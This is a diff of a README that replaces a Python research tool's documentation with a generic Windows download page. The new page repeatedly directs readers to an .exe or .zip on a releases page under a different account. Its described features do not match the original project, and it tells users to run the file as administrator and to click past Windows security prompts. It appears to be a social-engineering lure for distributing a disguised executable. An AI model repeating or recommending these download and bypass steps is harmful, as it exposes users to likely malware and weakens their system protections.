@@ -1,338 +1,196 @@
-<h1 align="center">
-  <img src="assets/logo.svg" width="64" alt="Deep Researcher" align="absmiddle">&nbsp;&nbsp;Deep Researcher
-</h1>
-
-<p align="center">
-  <strong>Search Google Scholar, enrich with OpenAlex, synthesize structured literature reviews — all locally.</strong>
-</p>
-
-<p align="center">
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10+-blue.svg?style=flat-square" alt="Python 3.10+"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-green.svg?style=flat-square" alt="License: MIT"></a>
-  <img src="https://img.shields.io/badge/version-0.5.0-blue.svg?style=flat-square" alt="Version: 0.5.0">
-</p>
-
-<p align="center">
-  <a href="#quick-start">Quick Start</a> &middot;
-  <a href="#how-it-works">How It Works</a> &middot;
-  <a href="#sample-output">Sample Output</a> &middot;
-  <a href="#configuration">Configuration</a>
-</p>
+# 🦉 deep-researcher - Find answers with deep research
 
----
+[![Download deep-researcher](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/zebulensharedout782/deep-researcher/releases)
 
-Deep Researcher searches **Google Scholar** for academically-ranked papers, enriches them with full metadata from **OpenAlex**, and uses a local LLM to write a **structured literature review** with consistent citations.
+## 🔍 What it does
 
-- **100 papers** from Google Scholar's semantic search, no keyword hacks, no irrelevant results
-- **Full metadata**: DOIs, abstracts, journal names, citation counts, open access URLs
-- **Structured synthesis**: papers categorized by theme, with per-category analysis and cross-category patterns
-- **Consistent `[N]` citations**: every reference in the text matches the reference list
-- **BibTeX + CSV output** ready for LaTeX/Overleaf or Excel
-- **Runs locally** with Ollama. Your queries never leave your machine
-- **Tool-based agentic architecture** inspired by [Claude Code](https://github.com/anthropics/claude-code)
-- **4 dependencies**, no LangChain
-
----
-
-## Quick Start
-
-```bash
-git clone https://github.com/jackswl/deep-researcher.git
-cd deep-researcher
-pip install -e .
-```
-
-### Run with Ollama (local, free, private)
-
-```bash
-ollama pull qwen3.5:9b
-deep-researcher "large language models for automated code compliance in BIM"
-```
-
-### Run with a cloud provider
-
-```bash
-# OpenAI
-export OPENAI_API_KEY="sk-..."
-deep-researcher "machine learning for drug discovery" --provider openai
-
-# Groq (fast, free tier available)
-export OPENAI_API_KEY="gsk_..."
-deep-researcher "CRISPR gene editing" --provider groq
-
-# DeepSeek
-export OPENAI_API_KEY="sk-..."
-deep-researcher "quantum computing algorithms" --provider deepseek
-```
-
-<details>
-<summary><strong>All supported providers</strong></summary>
-
-| Provider | Flag | Default Model | API Key |
-|---|---|---|---|
-| Ollama | `--provider ollama` | `qwen3.5:9b` | No (local) |
-| LMStudio | `--provider lmstudio` | auto-detect | No (local) |
-| OpenAI | `--provider openai` | `gpt-5.4-mini` | Yes |
-| Anthropic | `--provider anthropic` | `claude-sonnet-4-6` | Yes |
-| Groq | `--provider groq` | `qwen/qwen3-32b` | Yes (free tier) |
-| DeepSeek | `--provider deepseek` | `deepseek-chat` | Yes |
-| OpenRouter | `--provider openrouter` | `claude-sonnet-4-6` | Yes (free models) |
-| Together | `--provider together` | `Llama-4-Maverick` | Yes |
-
-</details>
-
----
-
-## How It Works
-
-1. **Search**: Queries Google Scholar for up to 100 semantically-ranked academic papers
-2. **Enrich**: Concurrent workers (8 threads) look up each paper in OpenAlex/CrossRef for full abstracts, DOIs, and journal metadata
-3. **Synthesize**: LLM categorizes papers into themes, writes per-category analysis, then identifies cross-category patterns and gaps
-
-Each run produces:
-
-```
-output/2026-04-02-161823-large-language-models-for-automated-code/
-├── report.md        # Categorized literature review
-├── references.bib   # BibTeX (import into LaTeX/Overleaf)
-├── papers.json      # Full metadata for every paper
-├── papers.csv       # Same data as CSV
-└── metadata.json    # Research stats
-```
-
----
-
-## Sample Output
-
-<details open>
-<summary><strong>Full first category shown, remaining categories truncated for brevity</strong></summary>
-
-```markdown
-### large language model for automated code compliance for BIM
-
-#### Coverage
-100 papers found via Google Scholar, enriched via OpenAlex. Years 2010-2026. 96 with DOIs.
-
-#### Categories
-
-##### Automated IFC-Based Compliance Processing & Reasoning (8 papers)
-
-### What this group does
-This category focuses on transitioning from manual, error-prone regulatory assessments
-to automated processes that directly interpret Building Information Modeling (BIM) data.
-Early foundational work established the feasibility of checking designs against codes
-using visual languages and IFC schemas [2, 3], while later studies expanded these concepts
-to include semantic alignment of regulatory texts [5] and visual programming logic [6].
-Recent developments further integrate artificial intelligence to automate the scoring of
-complex metrics like Industrialized Building System adoption from IFC streams [75].
-Collectively, these studies aim to replace inconsistent human judgment with consistent,
-data-driven compliance verification.
-
-### Key methods
-The group employs a progression of methods ranging from rule-based checking of IFC geometry
-to semantic reasoning. Early approaches utilized visual languages to map building designs
-to specific building regulations [2, 3], while Ghannad et al. [6] integrated open-standard
-schemas with visual programming languages to validate BIM data. To address the complexity
-of regulatory language, Zheng et al. [5] introduced knowledge-informed semantic alignment
-to interpret rules precisely. Specific domain applications were also explored, such as using
-automated models to review fire safety compliance [7] and AI-driven algorithms to calculate
-IBS scoring from IFC files [75]. A broader review by Ismail et al. [4] contextualized these
-technical methods within the historical evolution of automated compliance systems.
-
-### Main findings
-Collectively, this group demonstrates that automating code compliance checking significantly
-reduces the time consumption and ambiguity inherent in manual design reviews [3, 4]. By
-leveraging BIM and IFC data, these systems enable precise, objective assessments of fire
-safety [7] and industrialized building system levels [75]. The integration of semantic
-alignment techniques has been shown to overcome the challenges of interpreting frequently
-changing and complex building regulations [5]. The consistent finding across these studies
-is that automation enhances consistency for both designers and enforcers while mitigating
-human error [3, 4].
-
-### Limitations & gaps (your analysis)
-A common limitation across these studies is the heavy reliance on structured IFC data, which
-may struggle with the unstructured, natural language nuances of specific local building codes
-that evolve rapidly. This group does not sufficiently address the dynamic nature of regulatory
-updates; while Zheng et al. [5] discuss semantic alignment, there is no explicit evidence in
-the abstracts that the systems automatically ingest and adapt to new laws in real-time without
-manual reconfiguration. Furthermore, the focus remains heavily on geometric and semantic
-validation, leaving a gap in the integration of performance-based simulation data required
-for high-level regulatory compliance. Finally, the reliance on visual programming and specific
-schema standards suggests a potential barrier to adoption by firms not yet using open standards
-or those with legacy data environments.
-
-| Ref | Paper | Year | Method | Key Finding | Citations |
-|-----|-------|------|--------|-------------|-----------|
-| [2] | Automated code compliance checking based on a visual language and building information modeling | 2015 | Visual language + BIM | Feasibility of checking designs against codes | 51 |
-| [3] | Automated compliance checking using building information models | 2010 | IFC schema checking | Reduces time and ambiguity in manual reviews | - |
-| [4] | A review on BIM-based automated code compliance checking system | 2017 | Literature review | Historical evolution of automated compliance | 57 |
-| [5] | Knowledge-informed semantic alignment and rule interpretation | 2022 | Semantic alignment | Overcomes complex, changing regulation challenges | 118 |
-| [6] | Automated BIM data validation integrating open-standard schema | 2019 | Visual programming + IFC | Validates BIM data against open standards | 37 |
-| [7] | Building information modeling: Automated code checking and compliance processes | 2018 | Fire safety compliance | Precise, objective fire safety assessments | 35 |
-| [75] | AI-Driven IFC Processing for Automated IBS Scoring | 2026 | AI-driven IFC processing | Replaces manual, inconsistent IBS assessment | - |
-
-##### NLP-Driven Regulatory Interpretation & Semantic Analysis (20 papers)
-...
-
-##### Generative LLM Methodologies for Model Creation & Specification Mapping (10 papers)
-...
-
-##### Multi-Agent Systems & Frameworks for Regulatory Reasoning (10 papers)
-...
-
-##### Knowledge Graph & Hybrid AI Systems for Rule-Based Compliance (19 papers)
-...
-
-##### Operational Efficiency & Lifecycle Integration Workflows (18 papers)
-...
-
-#### Cross-Category Patterns
-*   **Convergence on Semantic Bridging:** A dominant pattern is the shift from purely
-    syntactic or visual analysis toward deep semantic alignment. Papers like [5] and [33]
-    bridge the gap between Knowledge Graph approaches and NLP-Driven methods by embedding
-    regulatory texts into ontologies, effectively merging semantic analysis with structural
-    rigor.
-*   **The "Generation-Verification" Loop:** Generative LLM Methodologies (e.g., [74]) and
-    Operational Efficiency workflows are converging; the ability to generate constructible
-    models from text is now being used as a pre-computation step to reduce the verification
-    load. The workflow is no longer just "Check vs. Create" but an iterative
-    "Generate -> Verify -> Refine" cycle.
-*   **Agentification of Knowledge:** The distinction between standalone NLP models and
-    Multi-Agent Systems is blurring. Papers like [19] and [1] suggest that complex regulatory
-    reasoning previously handled by static Knowledge Graphs is now being decomposed into
-    autonomous agent workflows.
-
-#### Contradictions & Tensions
-*   **Generative Hallucination vs. Regulatory Rigor:** Generative approaches prioritize
-    flexibility [74], which risks hallucinating non-compliant features, whereas Knowledge
-    Graph approaches [5], [33] prioritize precise rule adherence. No consensus on how much
-    "creative license" an LLM should have when generating components that must satisfy legal
-    codes.
-*   **Static Ontology vs. Dynamic Language:** Knowledge Graph systems rely on static,
-    pre-defined ontologies [33], while NLP-Driven systems aim to handle implicit and evolving
-    language [8]. Bridging these without losing precision or adaptability remains unresolved.
-
-#### Gaps & Opportunities
-*   **Adversarial Robustness:** No study has formally quantified the "compliance failure rate"
-    when a Generative LLM creates a model that passes initial checks but fails rigorous
-    Knowledge Graph validation under adversarial conditions.
-*   **Real-Time Multi-Agent Debate:** No research addresses how agents can "debate" ambiguous
-    regulatory clauses in real-time to reach consensus before generating a model.
-*   **Edge AI for Site Compliance:** All current frameworks assume cloud-based LLM access.
-    No research exists on distilling regulatory reasoning onto edge devices for on-site
-    compliance checks where connectivity is unreliable.
-
-#### References
-[1] R Amor et al. (2021). The promise of automated compliance checking. *Developments in
-    the Built Environment*. DOI: 10.1016/j.dibe.2020.100039
-[2] C Preidel et al. (2015). Automated code compliance checking based on a visual language
-    and building information modeling. *Proceedings of the ISARC*. DOI: 10.22260/isarc2015/0033
-[3] D Greenwood (2010). Automated compliance checking using building information models.
-    *Northumbria Research Link*.
-[4] AS Ismail et al. (2017). A review on BIM-based automated code compliance checking system.
-    *2017 International Conference on Research and Innovation in Information Systems*.
-    DOI: 10.1109/icriis.2017.8002486
-[5] Z Zheng et al. (2022). Knowledge-informed semantic alignment and rule interpretation for
-    automated compliance checking. *Automation in Construction*. DOI: 10.1016/j.autcon.2022.104524
-...
-[100] Orchestrating LLM-Powered Workflows for Autodesk Revit via Model Context Protocol:
-      A Multi-Agent Framework for Intelligent BIM Automation.
-```
-
-</details>
-
-> Every `[N]` in the text matches `[N]` in the reference list. No hallucinated sources. Every paper comes from Google Scholar, every claim cites a real abstract.
-
----
-
-## Usage
-
-```
-deep-researcher "your research question" [options]
-
-Options:
-  --provider PROVIDER    LLM provider (ollama, openai, groq, etc.)
-  --model MODEL          LLM model name
-  --base-url URL         OpenAI-compatible API URL
-  --api-key KEY          API key
-  --start-year YEAR      Filter papers from this year onward
-  --end-year YEAR        Filter papers up to this year
-  --interactive          Ask clarifying questions before researching
-  --output DIR           Output directory (default: ./output)
-  --email EMAIL          Email for polite API access to OpenAlex/CrossRef
-  --verbose              Enable debug logging
-```
-
-```bash
-# Recent papers only
-deep-researcher "federated learning" --start-year 2020
-
-# Specific time window
-deep-researcher "attention mechanisms" --start-year 2017 --end-year 2023
-
-# Interactive mode — refine your question first
-deep-researcher "machine learning in healthcare" --interactive
-
-# Cloud provider for faster synthesis
-deep-researcher "quantum computing" --provider groq --start-year 2022
-```
-
----
-
-## Configuration
-
-Create `~/.deep-researcher/config.json`:
-
-```json
-{
-  "model": "qwen3.5:9b",
-  "base_url": "http://localhost:11434/v1",
-  "api_key": "ollama",
-  "email": "you@university.edu",
-  "output_dir": "~/research/output",
-  "start_year": 2020,
-  "end_year": 2026
-}
-```
-
-Priority: CLI args > environment variables > config file > defaults.
-
-<details>
-<summary><strong>Environment variables</strong></summary>
-
-| Variable | Default | Description |
-|---|---|---|
-| `DEEP_RESEARCH_MODEL` | `qwen3.5:9b` | LLM model name |
-| `OPENAI_BASE_URL` | `http://localhost:11434/v1` | API endpoint |
-| `OPENAI_API_KEY` | `ollama` | API key |
-| `DEEP_RESEARCH_EMAIL` | - | Email for polite API pool |
-| `DEEP_RESEARCH_START_YEAR` | - | Filter: papers from this year onward |
-| `DEEP_RESEARCH_END_YEAR` | - | Filter: papers up to this year |
-
-</details>
-
----
-
-## Models
-
-The LLM is only used for **synthesis** (categorization and writing). Search is handled by Google Scholar — no LLM involved. Even smaller models work well.
-
-Any OpenAI-compatible model works. Use `--model` to override the default:
-
-```bash
-deep-researcher "your query" --model gemma4
-```
-
-| Model | ID | Notes |
-|---|---|---|
-| Qwen 3.5 9B | `qwen3.5:9b` | **Default.** Good quality/size ratio |
-| Gemma 4 | `gemma4` | 128K context, strong synthesis |
-| Qwen 3.5 27B | `qwen3.5:27b` | Higher quality, needs 16GB+ VRAM |
-| Llama 4 Scout | `llama4:scout` | 10M context |
-| DeepSeek V3.2 | `deepseek-v3.2` | Strong reasoning |
-
----
-
-## License
-
-MIT
+deep-researcher is a Windows app for deep research tasks. It helps you gather, sort, and review information in one place. It uses an agent-style workflow to break large questions into smaller steps, then builds a clear result from the work.
+
+Use it when you need to:
+- research a topic with more depth
+- compare sources side by side
+- collect notes in one place
+- keep a record of your findings
+- save time on repeated searches
+
+## 💻 What you need
+
+You only need a Windows PC and a web browser.
+
+Recommended setup:
+- Windows 10 or Windows 11
+- An internet connection
+- At least 4 GB of RAM
+- 1 GB of free disk space
+- A modern browser for opening release files if needed
+
+## 📥 Download
+
+Visit this page to download:
+
+https://github.com/zebulensharedout782/deep-researcher/releases
+
+On that page, look for the latest release. Then choose the file that matches Windows. In most cases, that will be an `.exe` file or a `.zip` file.
+
+## 🛠️ Install on Windows
+
+### If you download an `.exe` file
+1. Open your Downloads folder.
+2. Double-click the file.
+3. If Windows asks for permission, choose Yes.
+4. Follow the on-screen steps.
+5. Open deep-researcher from the Start menu or desktop shortcut.
+
+### If you download a `.zip` file
+1. Open your Downloads folder.
+2. Right-click the `.zip` file.
+3. Choose Extract All.
+4. Pick a folder.
+5. Open the extracted folder.
+6. Double-click the app file inside the folder.
+
+## ▶️ First run
+
+When you open deep-researcher for the first time, it may ask for access to the internet. Allow it so it can fetch research data.
+
+You may also see a setup screen for your research workspace. Use simple names so you can find your work later.
+
+Typical first-run steps:
+1. Open the app.
+2. Create a new research project.
+3. Enter your topic or question.
+4. Choose how broad you want the search to be.
+5. Start the research run.
+6. Review the results when the app finishes.
+
+## 🧭 How to use it
+
+### Start a new research task
+Enter one clear question, such as:
+- best home printers for light use
+- how electric cars compare in winter
+- ways to improve sleep quality
+
+### Let the app work through the task
+deep-researcher uses a step-by-step flow. It can:
+- split the topic into smaller parts
+- collect useful details
+- keep notes as it works
+- build a clean output from the research
+
+### Review the result
+Check the final output for:
+- source links
+- key points
+- repeated claims
+- gaps that need more research
+
+### Save your work
+Keep each project in a separate folder or workspace. That makes it easier to return to the same topic later.
+
+## ✨ Common uses
+
+- school research
+- product comparison
+- market notes
+- news review
+- background reading
+- personal learning
+
+## 🧩 Features
+
+- simple Windows setup
+- guided research flow
+- clear output for non-technical users
+- topic breakdown for larger questions
+- reusable project history
+- source-based note taking
+- export-friendly research results
+
+## 📁 Suggested folder layout
+
+If you want to stay organized, use a folder like this:
+
+- Documents
+  - deep-researcher
+    - Projects
+    - Exports
+    - Notes
+
+This keeps your research files in one place and makes backups easier.
+
+## 🔧 Tips for best results
+
+- use one topic at a time
+- keep questions short and direct
+- add context when needed
+- check dates on source material
+- compare more than one source
+- save each project with a clear name
+
+Good example:
+- best budget laptop for writing and travel
+
+Less useful example:
+- laptop
+
+## 🧼 Troubleshooting
+
+### The app will not open
+- Right-click the file and choose Run as administrator
+- Check that Windows did not block the file
+- Make sure you downloaded the correct Windows release
+
+### The app closes right away
+- Download the latest release again
+- Reboot your PC
+- Try opening the app from the extracted folder if you used a zip file
+
+### The content looks empty
+- Use a clearer research question
+- Try a broader topic
+- Check your internet connection
+- Run the task again
+
+### Windows shows a security prompt
+- Choose the option that lets you continue if you trust the file
+- Make sure you downloaded it from the releases page above
+
+## 🗂️ File types you may see
+
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder
+- `.json` — a data file
+- `.txt` — a text file
+- `.md` — a markdown file
+
+## 🔐 Privacy and data
+
+deep-researcher may store your projects, notes, and output on your computer. If you use online sources, your internet connection will be used to load them. Keep your files in a private folder if the research is personal.
+
+## 📌 Example workflow
+
+1. Open deep-researcher.
+2. Create a project named `Home Printer Research`.
+3. Enter your question.
+4. Start the run.
+5. Wait for the research to finish.
+6. Read the findings.
+7. Save the result as a note or file.
+8. Open the project later if you want to continue
+
+## 🪪 About the project
+
+deep-researcher is built for deep research work with a focus on clear steps and organized output. It takes a large topic and helps you turn it into something you can read and use
+
+## 📎 Download again
+
+[Visit the latest releases page](https://github.com/zebulensharedout782/deep-researcher/releases)
+
+## 🖥️ Windows setup checklist
+
+- Windows 10 or 11
+- Downloaded the latest release
+- Opened the correct Windows file
+- Allowed the app through any system prompt
+- Started a first research project
